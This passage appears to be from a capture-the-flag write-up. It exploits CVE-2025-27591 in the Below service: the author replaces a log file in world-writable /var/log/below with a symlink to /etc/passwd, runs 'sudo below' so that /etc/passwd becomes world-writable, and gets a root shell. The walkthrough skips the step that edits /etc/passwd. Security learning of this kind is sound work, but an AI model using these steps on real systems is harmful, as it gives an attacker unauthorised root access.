> A privilege escalation vulnerability existed in the Below service prior to v0.9.0 due to the creation of a world-writable directory at /var/log/below. This could have allowed local unprivileged users to escalate to root privileges through symlink attacks that manipulate files such as /etc/shadow.

https://github.com/rvzsec/CVE-2025-27591/blob/main/exploit.sh can do it

```
jacob@outbound:/dev/shm$ cd /var/log
jacob@outbound:/var/log$ ls -ld below/
drwxrwxrwx 3 root root 4096 Jun  5 03:26 below/
jacob@outbound:/var/log$ ls -l below/
total 4
lrwxrwxrwx 1 jacob jacob   11 Jun  5 03:26 error_jacob.log -> /etc/passwd
-rw-rw-rw- 1 root  root     0 Jul 14  2025 error_root.log
drwxr-xr-x 2 root  root  4096 Jun  5 02:09 store
```

While `error_root.log` is owned by root, jacob can still remove it:

Now I’ll create a symlink pointing to `passwd`:

```
jacob@outbound:/var/log$ ln -sf /etc/passwd below/error_root.log
jacob@outbound:/var/log$ ls -l below/
total 4
lrwxrwxrwx 1 jacob jacob   11 Jun  5 03:26 error_jacob.log -> /etc/passwd
lrwxrwxrwx 1 jacob jacob   11 Jun  5 03:27 error_root.log -> /etc/passwd
drwxr-xr-x 2 root  root  4096 Jun  5 02:09 store

```

I’ll run `sudo below`, then Ctrl-c to exit. Now `/etc/passwd` is 666:

```
jacob@outbound:/var/log$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1840 Jul 14  2025 /etc/passwd
```

```
jacob@outbound:/var/log$ su - oxdf
root@outbound:~# 

```

![Pasted image 20260605130514.png](/ob/Pasted%20image%2020260605130514.png)
